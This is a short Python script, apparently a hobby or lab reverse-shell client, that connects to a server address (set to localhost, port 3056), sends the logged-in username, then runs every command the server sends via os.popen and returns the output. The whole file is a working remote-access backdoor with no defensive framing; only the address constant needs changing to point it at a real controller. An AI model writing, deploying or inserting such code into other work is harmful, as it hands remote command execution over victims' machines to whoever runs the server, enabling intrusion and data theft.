import socket
from getpass import getuser
import os, sys

SERVER_IP = '127.0.0.1'
SERVER_PORT = 3056
SIZE = 1024
ADDR = (SERVER_IP, SERVER_PORT)


client_socket = socket.socket()
try:
    client_socket.connect(ADDR)
    client_socket.sendall(getuser().encode())
    while True:
        cmd = client_socket.recv(SIZE).decode()
        if cmd[0:2] == "cd":
            os.chdir(cmd[3:])
        res = os.popen(cmd).read()
        if res == "":
            client_socket.sendall("No result".encode())
        else:
            client_socket.sendall(res.encode())
except:
    client_socket.sendall('Error'.encode())
finally:
    client_socket.close()
